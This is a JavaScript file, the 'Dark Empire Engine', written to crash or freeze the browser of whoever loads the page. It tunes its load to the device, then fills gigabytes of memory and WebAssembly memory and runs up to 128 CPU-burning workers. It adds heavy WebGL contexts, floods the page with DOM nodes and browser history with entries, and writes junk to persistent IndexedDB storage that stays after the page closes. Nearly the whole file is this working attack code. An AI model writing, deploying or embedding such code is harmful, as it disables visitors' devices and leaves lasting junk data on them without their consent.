/* DARK EMPIRE ENGINE · core v3
   Shared by shell + sandboxed child realms. Flat root, relative paths. */
'use strict';
(function () {

const Q = new URLSearchParams(location.search);

function detectTier() {
  const m = navigator.deviceMemory || 4;
  const c = navigator.hardwareConcurrency || 4;
  if (c >= 12 || m >= 12) return 5;
  if (m >= 8 || c >= 8)   return 4;
  if (m >= 6 || c >= 6)   return 3;
  if (m >= 4 && c >= 4)   return 2;
  return 1;
}

const T = Math.max(1, Math.min(5, Number(Q.get('tier')) || detectTier()));
const MODE = (Q.get('mode') || 'full').toLowerCase();

const P = {
  chunk:      [8, 32, 64, 96, 128][T - 1] * 1048576,
  burst:      [2, 4, 8, 12, 16][T - 1],
  workers:    Math.min(128, (navigator.hardwareConcurrency || 4) * [4, 8, 12, 16, 20][T - 1]),
  contexts:   [3, 5, 8, 10, 12][T - 1],
  nodes:      [120000, 250000, 400000, 500000, 600000][T - 1],
  hist:       [30000, 60000, 90000, 120000, 150000][T - 1],
  storageMB:  [64, 256, 512, 1024, 2048][T - 1],
  realms:     [0, 0, 2, 4, 6][T - 1],
  shaderIt:   [96, 120, 160, 180, 200][T - 1],
  canvasSize: [256, 384, 512, 768, 1024][T - 1],
  gb:         [2, 4, 8, 12, 16][T - 1],
  blobs:      [16, 40, 80, 120, 160][T - 1],
  yieldMs:    40,
  audio:      1,
  dpr:        Math.min(window.devicePixelRatio || 1, T >= 4 ? 2.5 : 2)
};

const on = (k) => MODE === 'full' || MODE === k;

const hoard = [], workers = [], gls = [], wasmMems = [], blobURLs = [], objJunk = [];
const stats = { mem: 0, thr: 0, gpu: 0, nodes: 0, hist: 0, store: 0 };
let memDone = false, booted = false, dead = false, audioCtx = null, workerURL = null;
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

/* 4 KB page-stride commit — ek touch per page, poora buffer commit ho jata hai */
function commit(buf) {
  const v = new Uint8Array(buf);
  const n = v.length;
  if (!n) return;
  for (let i = 0; i < n; i += 4096) v[i] = 0x45;
  v[n - 1] = 0x45;
}

/* ---------- 1. HEAP ---------- */
async function memoryBomb() {
  if (!on('mem')) return;
  for (let i = 0; i < P.burst && !memDone; i++) {
    try { const b = new ArrayBuffer(P.chunk); commit(b); hoard.push(b); stats.mem += P.chunk; }
    catch (e) { memDone = true; break; }
    if (i % 4 === 3) await sleep(0);           /* HUD zinda rahe */
  }
  const ceiling = P.gb * 1073741824;
  let chunk = P.chunk, stall = 0, t0 = performance.now();
  while (!memDone && !dead && stats.mem < ceiling) {
    try {
      const b = new ArrayBuffer(chunk);
      commit(b);
      hoard.push(b);
      stats.mem += chunk;
      if (stats.mem > 262144000 && chunk < P.chunk * 4) chunk += P.chunk;
      stall = 0;
      if (performance.now() - t0 > P.yieldMs) { await sleep(0); t0 = performance.now(); }
    } catch (e) {
      if (chunk > 4194304) { chunk >>= 1; if (++stall > 10) break; await sleep(16); continue; }
      memDone = true;
    }
  }
}

/* ---------- 2. WASM ---------- */
async function wasmPressure() {
  if (!on('mem')) return;
  try {
    const m = new WebAssembly.Memory({ initial: 256, maximum: 65536 });
    wasmMems.push(m);
    let prev = 0;
    while (!memDone && !dead) {
      try {
        m.grow(2048);                            /* +128 MB step */
        const v = new Uint8Array(m.buffer);
        for (let i = prev; i < v.length; i += 4096) v[i] = 7;
        prev = v.length;
        stats.mem += 134217728;
      } catch (e) { break; }
      await sleep(4);
    }
  } catch (e) {}
}

/* ---------- 3. THREADS ---------- */
const WS = `
let junk = [], spin = 0, stop = false;
const BURN = () => { while (true) { for (let i = 0; i < 1e6; i++) spin += (Math.sqrt(i) | 0); } };
const HOARD = () => {
  const g = () => {
    if (stop) return;
    try {
      const b = new ArrayBuffer(33554432), v = new Uint8Array(b);
      for (let i = 0; i < v.length; i += 4096) v[i] = 1;
      junk.push(b);
    } catch (e) { stop = true; return; }          /* OOM pe junk chhodo mat */
    setTimeout(g, 1);
  };
  g();
};
const CHURN = () => {
  let k = 0;
  const l = () => {
    if (stop) return;
    const a = new Float64Array(1 << 20);
    for (let i = 0; i < a.length; i += 5) a[i] = Math.sin(i + k);
    junk.push(a); if (junk.length > 300) junk.splice(0, 90);
    k++; setTimeout(l, 0);
  };
  l();
};
const OBJ = () => {
  const l = () => {
    if (stop) return;
    for (let i = 0; i < 60000; i++) junk.push({ a: i * 1.7, b: 'x' + i, c: [i, i + 1, i + 2], d: { e: i } });
    if (junk.length > 900000) junk.length = 0;
    setTimeout(l, 0);
  };
  l();
};
self.onmessage = (e) => {
  const k = e.data;
  if (k === 'halt') { stop = true; return; }
  if (k === 'burn') BURN(); else if (k === 'hoard') HOARD();
  else if (k === 'obj') OBJ(); else CHURN();
};
`;

function spawnWorkers() {
  if (!on('thr')) return;
  workerURL = URL.createObjectURL(new Blob([WS], { type: 'text/javascript' }));
  let i = 0;
  const step = () => {
    for (let k = 0; k < 8 && i < P.workers; k++, i++) {
      try {
        const w = new Worker(workerURL);
        w.postMessage(i % 4 === 0 ? 'hoard' : i % 4 === 1 ? 'obj' : i % 4 === 2 ? 'burn' : 'churn');
        workers.push(w); stats.thr++;
      } catch (e) { return; }
    }
    if (i < P.workers && !dead) setTimeout(step, 30);
  };
  step();
}

/* ---------- 4. GPU ---------- */
const VS = 'attribute vec2 p; varying vec2 uv; void main(){ uv=p*0.5+0.5; gl_Position=vec4(p,0.,1.); }';
const fsFor = (it) => `precision highp float; varying vec2 uv; uniform float t; uniform sampler2D nz;
void main(){ vec3 c=vec3(0.);
for(int i=0;i<${it};i++){ float f=float(i)+1.;
c+=vec3(sin(uv.x*f+t),cos(uv.y*f-t),sin((uv.x+uv.y)*f)); }
gl_FragColor=vec4(c/float(${it})*0.6+texture2D(nz,uv*3.+t*.05).rgb*0.4,1.); }`;

const noise = document.createElement('canvas');
noise.width = noise.height = 256;
const nctx = noise.getContext('2d', { willReadFrequently: true });

function noiseTick() {
  if (dead) return;
  const img = nctx.createImageData(256, 256), d = img.data;
  for (let i = 0; i < d.length; i += 4) {
    const v = (Math.random() * 255) | 0;
    d[i] = d[i + 1] = d[i + 2] = v; d[i + 3] = 255;
  }
  nctx.putImageData(img, 0, 0);
}

function buildProgram(g, it) {
  const sh = (ty, s) => { const o = g.createShader(ty); g.shaderSource(o, s); g.compileShader(o); return o; };
  const v = sh(g.VERTEX_SHADER, VS), f = sh(g.FRAGMENT_SHADER, fsFor(it));
  if (!g.getShaderParameter(v, g.COMPILE_STATUS)) return null;
  if (!g.getShaderParameter(f, g.COMPILE_STATUS)) return null;
  const pr = g.createProgram();
  g.attachShader(pr, v); g.attachShader(pr, f); g.linkProgram(pr);
  return g.getProgramParameter(pr, g.LINK_STATUS) ? pr : null;
}

function makeGL() {
  if (gls.length >= P.contexts || dead) return;
  const c = document.createElement('canvas');
  c.className = 'dee';
  c.width  = Math.round(innerWidth  * P.dpr);
  c.height = Math.round(innerHeight * P.dpr);
  document.body.appendChild(c);

  const g = c.getContext('webgl', {
    antialias: false, depth: false, stencil: false, alpha: false,
    powerPreference: 'high-performance'
  });
  if (!g) { c.remove(); return; }

  const pr = buildProgram(g, P.shaderIt) || buildProgram(g, 96);   /* unroll-limit fallback */
  if (!pr) { c.remove(); return; }

  g.useProgram(pr);
  g.bindBuffer(g.ARRAY_BUFFER, g.createBuffer());
  g.bufferData(g.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), g.STATIC_DRAW);
  const l = g.getAttribLocation(pr, 'p');
  g.enableVertexAttribArray(l);
  g.vertexAttribPointer(l, 2, g.FLOAT, false, 0, 0);

  const tx = g.createTexture();
  g.bindTexture(g.TEXTURE_2D, tx);
  g.texParameteri(g.TEXTURE_2D, g.TEXTURE_MIN_FILTER, g.LINEAR);
  g.texParameteri(g.TEXTURE_2D, g.TEXTURE_WRAP_S, g.REPEAT);
  g.texParameteri(g.TEXTURE_2D, g.TEXTURE_WRAP_T, g.REPEAT);

  gls.push({ g, tx, t: g.getUniformLocation(pr, 't') });
  stats.gpu = gls.length;
}

function gpuLoop(t) {
  if (dead) return;
  const tt = t * 0.001;
  for (const e of gls) {
    if (e.g.isContextLost()) continue;
    e.g.bindTexture(e.g.TEXTURE_2D, e.tx);
    e.g.texImage2D(e.g.TEXTURE_2D, 0, e.g.RGB, e.g.RGB, e.g.UNSIGNED_BYTE, noise);
    e.g.uniform1f(e.t, tt);
    e.g.drawArrays(e.g.TRIANGLE_STRIP, 0, 4);
  }
  requestAnimationFrame(gpuLoop);
}

/* ---------- 5. DOM ---------- */
async function domBomb() {
  if (!on('dom')) return;
  const host = document.getElementById('domhost') || document.body;
  let made = 0;
  while (made < P.nodes && !dead) {
    const f = document.createDocumentFragment();
    for (let i = 0; i < 40000 && made < P.nodes; i++, made++) {
      const d = document.createElement('div');
      d.style.cssText =
        'left:' + (Math.random() * 100).toFixed(2) + '%;' +
        'top:'  + (Math.random() * 100).toFixed(2) + '%;';
      f.appendChild(d);
    }
    host.appendChild(f);
    stats.nodes = made;
    void document.body.offsetHeight;
    document.body.getBoundingClientRect();
    await sleep(0);
  }
}

/* ---------- 6. HISTORY ---------- */
async function historyBomb() {
  if (!on('hist')) return;
  let hashMode = false;                     /* Chrome/iOS: 100 calls / 30 s limit */
  while (stats.hist < P.hist && !dead) {
    for (let i = 0; i < 200 && stats.hist < P.hist; i++) {
      if (!hashMode) {
        try { history.pushState({ n: stats.hist }, '', '#' + stats.hist); }
        catch (e) { hashMode = true; }
      }
      if (hashMode) { try { location.hash = 'h' + stats.hist; } catch (e) {} }
      stats.hist++;
    }
    await sleep(0);
  }
}

/* ---------- 7. STORAGE ---------- */
async function storageFill() {
  if (!on('store') || !P.storageMB) return;
  let db;
  try {
    db = await new Promise((res, rej) => {
      const r = indexedDB.open('darkempire', 1);
      r.onupgradeneeded = () => r.result.createObjectStore('b');
      r.onsuccess = () => res(r.result);
      r.onerror   = () => rej(r.error);
    });
  } catch (e) { return; }

  try { await navigator.storage?.persist?.(); } catch (e) {}
  try {                                     /* asli usage se seed */
    const est = await navigator.storage?.estimate?.();
    if (est && est.usage) stats.store = est.usage / 1048576;
  } catch (e) {}

  const base = Date.now().toString(36) + '-';    /* unique keys, overwrite nahi */
  let i = 0;
  while (stats.store < P.storageMB && !dead) {
    const pay = new Uint8Array(8388608).fill(i & 255);
    const ok = await new Promise((res) => {
      try {
        const tx = db.transaction('b', 'readwrite');
        tx.objectStore('b').put(new Blob([pay]), base + i);
        tx.oncomplete = () => res(true);
        tx.onerror = tx.onabort = () => res(false);
      } catch (e) { res(false); }
    });
    if (!ok) break;
    i++; stats.store += 8;
    await sleep(0);
  }
}

/* ---------- 8. AUDIO ---------- */
function audioStress() {
  if (!P.audio || !on('gpu')) return;
  try {
    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    audioCtx.resume?.().catch(() => {});
    const conv = audioCtx.createConvolver();
    const ir = audioCtx.createBuffer(2, audioCtx.sampleRate * 4, audioCtx.sampleRate);
    for (let c = 0; c < 2; c++) {
      const d = ir.getChannelData(c);
      for (let i = 0; i < d.length; i++) d[i] = Math.random() * 2 - 1;
    }
    conv.buffer = ir;
    conv.connect(audioCtx.destination);
    for (let i = 0; i < 96; i++) {
      const o = audioCtx.createOscillator(), g = audioCtx.createGain();
      o.type = 'sawtooth';
      o.frequency.value = 20 + Math.random() * 14000;
      g.gain.value = 0.0008;
      o.connect(g); g.connect(conv); o.start();
    }
  } catch (e) {}
}

/* ---------- 9. BLOB / OBJ / CANVAS ---------- */
function blobLeak() {
  if (!on('mem')) return;
  for (let i = 0; i < P.blobs; i++) {
    try { blobURLs.push(URL.createObjectURL(new Blob([new Uint8Array(8388608).fill(i & 255)]))); }
    catch (e) { break; }
  }
}

function objectChurn() {
  if (!on('thr')) return;
  const l = () => {
    if (dead) return;
    for (let i = 0; i < 40000; i++) objJunk.push({ a: Math.random(), b: 'y' + i, c: [i], d: { e: Math.random() } });
    if (objJunk.length > 700000) objJunk.length = 0;
    setTimeout(l, 0);
  };
  l();
}

function canvasStress() {
  if (!on('gpu')) return;
  const S = P.canvasSize;
  const c = document.createElement('canvas');
  c.width = c.height = S;
  c.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;opacity:.06;pointer-events:none;';
  document.body.appendChild(c);
  const x = c.getContext('2d');
  const img = x.createImageData(S, S);
  const l = () => {
    if (dead) return;
    const d = img.data;
    for (let i = 0; i < d.length; i += 4) {
      const v = (Math.random() * 255) | 0;
      d[i] = v; d[i + 1] = v >> 1; d[i + 2] = 255 - v; d[i + 3] = 255;
    }
    x.putImageData(img, 0, 0);
    requestAnimationFrame(l);
  };
  l();
}

/* ---------- run / stop ---------- */
function run() {
  if (booted) return;
  booted = true;

  if (on('gpu')) {
    for (let i = 0; i < P.contexts; i++) setTimeout(() => makeGL(), i * 60);
    noiseTick();
    requestAnimationFrame(gpuLoop);
    setInterval(noiseTick, 90);
  }

  spawnWorkers();
  memoryBomb(); wasmPressure();
  domBomb(); historyBomb();
  blobLeak(); objectChurn(); canvasStress(); audioStress();
  if (MODE === 'full') storageFill();
}

function stop() {
  dead = true; memDone = true;
  for (const w of workers) { try { w.postMessage('halt'); w.terminate(); } catch (e) {} }
  for (const u of blobURLs) URL.revokeObjectURL(u);
  if (workerURL) URL.revokeObjectURL(workerURL);
  try { audioCtx?.close(); } catch (e) {}
  workers.length = 0; gls.length = 0; blobURLs.length = 0;
}

window.DEE = {
  run, stop, stats, P, T, MODE, on,
  makeGL, spawnWorkers, memoryBomb, wasmPressure, domBomb, historyBomb,
  storageFill, blobLeak, objectChurn, canvasStress, audioStress,
  noiseTick, gpuLoop, commit, sleep,
  set booted(v) { booted = v; },
  get booted() { return booted; }
};
})();
